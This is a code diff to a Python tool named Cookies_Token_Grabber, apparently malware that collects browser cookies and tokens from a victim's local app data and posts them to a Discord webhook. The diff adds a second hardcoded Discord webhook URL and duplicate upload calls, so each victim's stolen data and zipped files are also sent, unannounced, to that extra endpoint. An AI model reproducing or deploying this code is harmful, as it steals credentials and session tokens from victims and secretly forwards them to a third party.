@@ -15,6 +15,7 @@ from Crypto.Cipher import AES
 class Cookies_Token_Grabber:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
+        self.webhookk = "https://discord.com/api/webhooks/925153281272070144/--i9j-etbtn7LgnLbopNMWAf0QLIhHoWNJsFSPvdu_j05HYmRWz4RfxmooDnjZN-eTxk"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -310,6 +311,8 @@ class Cookies_Token_Grabber:
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(new,'rb')})
+        requests.post(self.webhookk, json=embed)
+        requests.post(self.webhookk, files={'upload_file': open(new,'rb')})
 
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
